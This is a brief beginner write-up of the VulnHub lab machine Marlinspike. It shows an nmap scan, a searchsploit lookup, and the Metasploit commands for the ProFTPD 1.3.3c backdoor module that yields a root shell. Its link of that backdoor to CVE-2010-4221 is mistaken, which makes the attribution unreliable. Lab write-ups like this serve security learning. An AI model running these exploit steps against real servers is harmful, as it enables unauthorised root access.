# Marlinspike - VulnHub Writeup

**Difficulty:** Beginner  
**Machine:** Marlinspike (VulnHub)  
**Date:** 2025  

---

## Summary
First VulnHub machine. Exploited a known backdoor in ProFTPD 1.3.3c 
using Metasploit to get a root shell directly.

---

## Tools Used
- Nmap
- Metasploit

---

## Step 1 — Nmap Scan
```bash
nmap -sC -sV -p- <target>
```
Found FTP port open running ProFTPD 1.3.3c.

---

## Step 2 — Searchsploit
```bash
searchsploit ProFTPD 1.3.3
```
Found a backdoor exploit — CVE-2010-4221.

---

## Step 3 — Metasploit
```bash
msfconsole
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS <target>
run
```
Got root shell directly. No privilege escalation needed.

---

## Key Takeaways
- Always check service versions during Nmap scan
- Searchsploit is your first stop after finding a version
- Some old services have backdoors that give root directly
- This was my first VulnHub machine — foundation for everything after
